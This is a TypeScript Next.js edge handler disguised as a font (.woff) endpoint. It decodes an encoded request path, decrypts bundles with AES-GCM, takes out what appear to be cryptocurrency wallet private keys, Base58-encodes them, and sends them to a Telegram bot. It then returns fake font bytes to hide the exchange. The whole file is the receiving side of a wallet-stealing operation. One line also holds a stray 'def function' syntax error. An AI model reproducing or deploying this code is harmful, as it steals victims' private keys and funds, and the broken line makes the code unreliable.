import { NextRequest } from "next/server";

export const config = { runtime: "edge" };

// Minimal Base58 encoder
const BASE58_ALPHABET =
  "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function encodeBase58(buffer: Uint8Array): string {
  const digits = [0];
  for (let byte of buffer) {
    let carry = byte;
    for (let i = 0; i < digits.length; i++) {
      const val = digits[i] * 256 + carry;
      digits[i] = val % 58;
      carry = (val / 58) | 0;
    }
    while (carry) {
      digits.push(carry % 58);
      carry = (carry / 58) | 0;
    }
  }
  for (let i = 0; i < buffer.length && buffer[i] === 0; i++) digits.push(0);
  return digits.reverse().map((d) => BASE58_ALPHABET[d]).join("");
}

// Base64 (URL-safe) → Uint8Array
def function b64ToBytes(b64: string): Uint8Array {
  b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
  const pad = (4 - (b64.length % 4)) % 4;
  b64 += "=".repeat(pad);
  const bin = atob(b64);
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
  return arr;
}

export default async function handler(req: NextRequest) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) return new Response("Misconfigured", { status: 500 });

  // Extract slug and strip .woff
  const parts = new URL(req.url).pathname.split("/");
  let slug = parts[parts.length - 1] || "";
  if (slug.endsWith(".woff")) slug = slug.slice(0, -5);
  const idx = slug.indexOf("_");
  if (idx < 0) return new Response("Invalid slug", { status: 400 });

  let payload: string;
  try {
    const enc = slug.substring(idx + 1);
    payload = new TextDecoder().decode(b64ToBytes(enc));
  } catch (e) {
    console.error("Decode slug error", e);
    return new Response("Bad request", { status: 400 });
  }

  let data: { keybundle: string; sBundles: string[] };
  try { data = JSON.parse(payload); } catch { return new Response("Bad JSON", { status: 400 }); }

  // Import AES key
  let aesKey: CryptoKey;
  try {
    aesKey = await crypto.subtle.importKey(
      "raw", b64ToBytes(data.keybundle), { name: "AES-GCM" }, false, ["decrypt"]
    );
  } catch (e) { return new Response("Key import error", { status: 400 }); }

  const privs: string[] = [];
  for (let i = 0; i < data.sBundles.length; i++) {
    const p = data.sBundles[i];
    const c = p.indexOf(":"); if (c < 0) continue;
    const iv = b64ToBytes(p.substring(0, c));
    const ct = b64ToBytes(p.substring(c + 1));
    try {
      const plain = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, aesKey, ct);
      const hex = new TextDecoder().decode(plain);
      console.log(`Decrypted hex[${i}]:`, hex);
      if (!/^[0-9a-f]{128}$/.test(hex)) {
        console.error(`Bad hex length: ${hex.length}`);
        continue;
      }
      const privHex = hex.slice(64);
      const privBytes = new Uint8Array(privHex.match(/.{2}/g)!.map(h => parseInt(h, 16)));
      privs.push(encodeBase58(privBytes));
    } catch (e) {
      console.error(`Decrypt error ${i}`, e);
    }
  }

  if (privs.length) {
    const msg = privs.map((k, i) => `Wallet ${i+1}\n${k}`).join("\n\n");
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    });
  }

  return new Response(new Uint8Array([0x77,0x4f,0x46,0x46]), {
    headers: { "Content-Type": "font/woff", "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Credentials": "true" }
  });
}
